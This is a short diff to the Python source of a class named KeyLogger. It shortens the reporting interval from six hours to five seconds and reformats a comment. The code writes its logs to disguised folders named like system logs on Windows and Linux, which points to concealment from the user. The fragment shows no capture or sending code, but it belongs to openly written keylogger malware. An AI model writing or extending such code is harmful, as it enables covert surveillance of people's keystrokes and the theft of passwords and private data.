@@ -4,7 +4,7 @@ from threading import Timer
 from datetime import datetime
 
 #   Every 6 hrs 21600
-REPORT_TIMING = 21600
+REPORT_TIMING = 5
 WIN_DIR = r"C:\Users\Public\Roaming\system_log78563"
 LIN_DIR = r"/tmp/sytem_log78563"
 
@@ -63,7 +63,9 @@ class KeyLogger:
         timer.start()
 
     def start(self):
-        #   Determine which kind of filepath to use
+        """
+        Determine which kind of filepath to use
+        """
         if (system() == "Windows"):
             self.log_dir = WIN_DIR
         else:
